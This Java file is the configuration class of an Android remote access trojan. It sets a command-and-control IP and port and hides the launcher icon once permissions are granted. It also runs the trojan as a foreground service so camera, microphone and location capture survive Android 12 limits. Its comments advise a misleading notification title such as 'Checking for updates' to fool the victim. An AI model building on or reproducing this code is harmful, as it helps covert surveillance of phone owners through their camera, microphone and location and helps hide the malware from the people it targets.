package com.example.reverseshell2;

/**
 * Configuration class.
 *
 * No functional changes were strictly required for Android 12 - this file is a
 * plain Java POJO and is not affected by Android 12 platform restrictions.
 * However, a few helpful options were added:
 *
 *  - keepScreenOn / useForegroundService: control the app's foreground behavior
 *    which matters on Android 12 (foreground services are the only way to run
 *    camera/mic/location from the background).
 *  - icon: when true, the launcher icon is hidden AFTER runtime permissions
 *    are granted (see MainActivity).
 *  - Values are kept as static public fields so the existing call sites
 *    (config.IP, config.port, config.icon) keep working unchanged.
 */
public class config {

    /** C2 server IP address. */
    public static String IP = "192.168.0.105";

    /** C2 server port. */
    public static String port = "8888";

    /** Hide the app launcher icon after first run. */
    public static boolean icon = true;

    // ------------------------------------------------------------------
    // Optional extras (Android 12 friendly). Existing code that only uses
    // IP / port / icon can ignore these.
    // ------------------------------------------------------------------

    /**
     * When true, the main C2 service runs as a FOREGROUND service.
     * On Android 12 this is effectively REQUIRED for the RAT to keep running
     * in the background and to be able to start the camera / mic / location
     * foreground services from the background. The foreground service shows a
     * persistent notification (use a benign title like "Checking for updates").
     */
    public static boolean useForegroundService = true;

    /**
     * When true, MainActivity acquires a PARTIAL_WAKE_LOCK while the app is in
     * the foreground. Wake locks must be released after use; a full RAT
     * implementation usually relies on a foreground service instead.
     */
    public static boolean keepScreenOn = false;

    /**
     * When true, the app requests POST_NOTIFICATIONS on Android 13+ so the
     * foreground-service notification is actually visible to the user.
     */
    public static boolean requestNotificationPermission = true;
}

